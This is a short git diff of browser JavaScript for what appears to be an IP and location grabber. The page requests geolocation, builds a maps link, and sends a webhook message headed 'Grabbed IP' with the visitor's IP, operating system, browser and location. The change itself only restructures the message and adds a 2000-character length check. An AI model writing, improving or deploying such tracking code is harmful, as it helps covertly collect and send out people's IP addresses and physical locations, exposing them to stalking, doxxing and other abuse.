@@ -1,4 +1,5 @@
 let mapsUrl = "";
+
 // Function to request location permission
 function requestLocationPermission() {
     if (navigator.geolocation) {
@@ -30,9 +31,16 @@ function error(err) {
 function sendWebhook(ip) {
     // Prepare the payload
     const platformInfo = `${navigator.platform}, Browser: ${navigator.userAgent}`;
-    const content = `Grabbed IP: ${ip}\nOS Info: ${platformInfo}\nMaps Location URL: ${mapsUrl}`;
+    const mapsLocation = `Maps Location URL: ${mapsUrl}`;
+    const content = `Grabbed IP: ${ip}\nOS Info: ${platformInfo}\n${mapsLocation}`;
 
     console.log(`Content Length: ${content.length}`);
+
+    // Check if content length exceeds 2000 characters
+    if (content.length > 2000) {
+        console.error('Content length exceeds 2000 characters.');
+        return;
+    }
 
     const payload = {
         content: content  // Webhooks expect the key 'content' for the message body
